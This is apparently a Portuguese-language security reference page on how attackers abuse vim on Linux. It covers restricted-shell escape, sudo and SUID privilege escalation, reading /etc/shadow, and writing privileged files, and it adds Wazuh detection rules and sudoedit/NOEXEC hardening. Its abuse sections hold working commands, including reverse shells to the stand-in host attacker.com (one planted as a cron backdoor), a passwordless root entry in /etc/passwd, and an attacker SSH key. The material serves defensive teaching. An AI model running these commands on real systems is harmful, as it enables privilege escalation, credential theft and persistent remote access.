# vim

**Plataforma:** Linux / macOS / Unix

**Categorias:** Shell escape, Execução de código, Leitura e escrita de arquivos, Escalada de privilégios (sudo/SUID)

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1548.001 (SUID/SGID), T1005 (Data from Local System)

**Referência ofensiva:** https://gtfobins.org/gtfobins/vim/

---

## O que é o vim

O vim (Vi IMproved) é um editor de texto avançado, amplamente considerado o editor padrão em servidores Linux. Está presente em praticamente toda instalação de servidor, seja como `vim`, `vi`, `vim.basic` ou `vim.tiny`, dependendo da distribuição e da variante instalada.

A característica que o torna relevante para segurança é o seu sistema de comandos interno. O vim tem um modo de comando (ativado com `:`) que permite executar comandos do shell, ler e escrever arquivos arbitrários, e até mesmo executar código Python, Lua ou Perl embutido — dependendo das funcionalidades compiladas na versão instalada.

---

## Por que atacantes usam o vim

O vim aparece principalmente em dois cenários: escape de ambientes restritos (rbash, sudoedit, ambientes de container com shell limitado) e escalada de privilégios quando configurado incorretamente no sudoers. É também uma das primeiras coisas que um atacante testa ao obter acesso a um shell restrito, pois a presença do vim é quase certa e o escape via `:!bash` é trivial.

---

## Técnicas de abuso

### Escape de shell restrito (rbash, ambiente restrito)

Se um usuário está preso em um shell restrito mas tem acesso ao vim:

```bash
# Abrir vim e executar bash via comando interno
vim -c ':!/bin/bash'

# Alternativa via :shell (abre o shell configurado em $SHELL)
vim -c ':shell'

# Via :set shell e :shell
vim -c ':set shell=/bin/bash' -c ':shell'

# Escape sem abrir arquivo
vim -c ':! bash -i >& /dev/tcp/attacker.com/4444 0>&1'
```

### Execução de comandos arbitrários

```bash
# Executar comando único e retornar ao vim
# (dentro do vim)
:!id
:!whoami
:!/bin/bash

# Executar e capturar saída no buffer do editor
:r !cat /etc/passwd
:r !id

# Via filtro de linha (executa comando no conteúdo selecionado)
:% !bash
```

### Escalada de privilégios via sudo

Se o sudoers permite executar vim sem restrições:

```bash
# Se sudoers: user ALL=(ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# Mais discreto: abre o vim normalmente e executa o shell de dentro
sudo vim /etc/hosts
# Dentro do vim:
:!/bin/bash
```

Uma variante comum em ambientes corporativos é o sudoers dar acesso ao `vim /etc/` para que o usuário edite configurações — mas sem restringir a execução de subcomandos dentro do vim. Isso equivale a acesso root completo.

### Abuso de SUID

```bash
# Verificar SUID
find / -name vim -perm -4000 2>/dev/null

# Com SUID, executar shell root
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# Versão mais simples (se Python não está disponível no vim)
./vim -c ':!/bin/sh -p'
```

### Leitura de arquivos privilegiados

```bash
# Ler arquivo não acessível ao usuário atual (com sudo ou SUID)
sudo vim /etc/shadow
# Dentro do vim: o arquivo é exibido integralmente

# Via comando de linha (sem interface interativa)
sudo vim -c ':r /etc/shadow' -c ':w /tmp/shadow_copy' -c ':q!'
```

### Escrita de arquivos privilegiados

```bash
# Com sudo, adicionar usuário root ao /etc/passwd
sudo vim -c ':1' -c ':norm Oroot2::0:0:root:/root:/bin/bash' -c ':wq' /etc/passwd

# Adicionar chave SSH ao root
sudo vim -c ':r! echo "ssh-rsa AAAA... attacker"' -c ':w /root/.ssh/authorized_keys' -c ':q!'

# Adicionar entrada de cron para shell reverso
sudo vim -c ':r! echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1"' \
         -c ':w /etc/cron.d/backdoor' -c ':q!'
```

### Execução de código Python/Lua via vim embutido

Versões do vim compiladas com suporte a Python ou Lua permitem execução de código nativo:

```bash
# Via Python embutido no vim
vim -c ':py import os; os.system("/bin/bash")'
vim -c ':python3 import os; os.system("/bin/bash")'

# Via Lua embutido
vim -c ':lua os.execute("/bin/bash")'
```

---

## Técnicas de bypass e evasão

### Uso de vi, view, rvim e variantes

```bash
# Variantes do vim disponíveis no sistema
vi -c ':!/bin/bash'
view -c ':!/bin/bash'    # modo somente leitura do vim — ainda permite :!
rvim -c ':!/bin/bash'    # "restricted vim" — em muitas versões ainda permite :!
```

### vimdiff como vetor alternativo

```bash
sudo vimdiff /etc/passwd /etc/shadow
# Dentro do vimdiff:
:!/bin/bash
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- vim executado via sudo combinado com argumento `-c` contendo `!` (execução de subcomando)
- vim com SUID em localização fora do padrão
- vim executado por processo filho de servidor web
- vim escrevendo em arquivos críticos do sistema (`/etc/passwd`, `/etc/cron.d/`, `/root/.ssh/`)

**Indicadores de média relevância:**

- vim com `-c ':shell'` ou `-c ':set shell'`
- vim com argumento `-c` contendo `/bin/bash` ou `/bin/sh`
- vim executado em contexto de cron ou daemon (não interativo)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/linux/0101-gtfobins_execution.xml -->

<!-- vim com -c executando shell ou subcomando -->
<rule id="100225" level="13">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^v(im?|iew|imdiff)$</field>
  <field name="audit.execve" type="pcre2">-c.*(!|:shell|:set shell)</field>
  <description>vim executado com -c contendo execucao de subcomando — possivel escape de shell restrito</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>

<!-- vim executado por conta de serviço web -->
<rule id="100226" level="12">
  <if_group>auditd</if_group>
  <field name="audit.command" type="pcre2">^v(im?|iew)$</field>
  <field name="audit.uid" type="pcre2">^(33|65534|99)$</field>
  <description>vim executado por conta de servico web — contexto altamente suspeito</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Administradores editando arquivos de configuração via sudo:** o uso legítimo de `sudo vim /etc/arquivo` é comum. O indicador relevante não é o vim com sudo em si, mas sim o uso de `-c` com execução de subcomandos. Foque nos argumentos, não apenas no binário.

---

## Proteção e controles defensivos

**Usar sudoedit em vez de sudo vim:** o `sudoedit` é projetado especificamente para edição privilegiada de arquivos e não permite execução de subcomandos dentro do editor. Substitua entradas `NOPASSWD: /usr/bin/vim` por `NOPASSWD: sudoedit` no sudoers.

**NOEXEC no sudoers:** a tag `NOEXEC` no sudoers previne que programas executados via sudo criem processos filhos, bloqueando o `:!bash` dentro do vim:

```
user ALL=(ALL) NOEXEC: /usr/bin/vim
```

Note que NOEXEC tem limitações e pode não funcionar em todas as situações — `sudoedit` continua sendo a abordagem preferida.

---

## Referências

- GTFOBins — vim: https://gtfobins.org/gtfobins/vim/
- MITRE ATT&CK T1059.004: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/
